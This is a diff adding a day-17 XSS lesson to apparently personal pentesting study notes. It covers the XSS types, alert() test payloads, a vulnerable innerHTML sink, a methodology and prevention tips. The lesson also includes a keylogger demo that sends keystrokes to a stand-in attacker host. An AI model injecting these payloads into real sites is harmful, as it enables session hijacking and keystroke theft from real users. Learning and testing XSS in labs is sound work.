@@ -1229,3 +1229,79 @@ Combination: Use Burp to find injection points, SQLMap to exploit them
 This information is provided for educational purposes only.
 Do not perform SQL injection attacks on systems you do not own or have permission to test.
 ---
+
+# Day 17 — XSS (Cross-Site Scripting)
+
+> Educational use only. Test only systems you own or have explicit permission to test.
+
+## What is XSS?
+XSS lets attackers inject JavaScript that runs in other users’ browsers due to improper input handling and output encoding. Impact includes session hijacking, data theft, keylogging, phishing, and defacement.
+
+## Types
+- **Stored XSS** — Payload stored server-side (DB, comments). Triggers when anyone views.
+- **Reflected XSS** — Payload delivered in request and reflected immediately in response.
+- **DOM XSS** — Client-side JS reads attacker-controlled data and writes it into the DOM insecurely.
+
+## Quick Examples
+
+### Reflected
+```
+https://vuln.example.com/search?q=%3Cscript%3Ealert('Reflected%20XSS')%3C/script%3E
+```
+
+### Stored
+Comment payload:
+```html
+<script>alert('Stored XSS')</script>
+<!-- or -->
+<img src=x onerror=alert('Stored XSS')>
+```
+
+### DOM
+Vulnerable code:
+```js
+document.getElementById('out').innerHTML = location.hash.substring(1);
+```
+Trigger:
+```
+https://vuln.example.com/#%3Cscript%3Ealert('DOM%20XSS')%3C/script%3E
+```
+
+## Useful Test Payloads
+```html
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+<a href="javascript:alert('XSS')">click</a>
+```
+
+## Keylogger (Demo)
+```html
+<script>
+document.addEventListener('keypress', e => {
+  fetch('https://attacker.example/log?k='+encodeURIComponent(e.key));
+});
+</script>
+```
+
+## Methodology
+1. Map inputs (forms, params, fragments).
+2. Probe with harmless payloads.
+3. Identify reflection/storage or DOM sinks.
+4. Escalate impact in a safe lab (cookies, keylogging demo).
+5. Document findings and propose mitigations.
+
+## TryHackMe Practice
+Use a dedicated XSS room or web fundamentals labs to practice reflected, stored, and DOM XSS in a safe environment. Reproduce alerts via URL/query/fragment; then demonstrate impact carefully.
+
+## Prevention Cheat Sheet
+- Context-aware output encoding.
+- Avoid dangerous sinks; prefer `textContent` and DOM APIs.
+- Validate/sanitize input (DOMPurify when needed).
+- Cookies: `Secure`, `HttpOnly`, `SameSite`.
+- Content Security Policy (CSP).
+- Automated testing & security scanners.
+
+---
+
+
